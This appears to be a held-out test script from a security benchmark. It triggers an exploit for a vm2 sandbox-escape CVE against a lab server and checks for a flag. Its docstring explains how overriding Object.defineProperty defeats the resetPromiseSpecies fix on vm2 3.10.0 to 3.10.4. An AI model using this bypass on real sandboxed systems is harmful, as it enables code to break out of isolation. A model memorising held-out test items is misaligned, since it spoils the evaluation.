#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-24120 residual exploit for vm2-cve-2026-24120.

resetPromiseSpecies (the CVE-2023-37466 fix) changes the promise species back to
a known value, but it uses [].includes and Object.defineProperty which the
sandboxed code overrides (Object.defineProperty = () => {}) before triggering
the escape. On v1 (3.10.0..3.10.4) the species reset is defeated; on v2 (3.10.5)
the fix hardens resetPromiseSpecies.
"""
import sys
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import vm2_util as u  # noqa: E402


def candidate(*, version="v1", flag=None):
    try:
        urllib.request.urlopen(f"{u.BASE[version]}/exploit?kind=24120", timeout=30).read()
    except Exception:
        pass
    out = u.read_result(version)
    return {"ok": (flag in out) if flag else bool(out), "result": out[:100]}


if __name__ == "__main__":
    v = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(candidate(version=v))
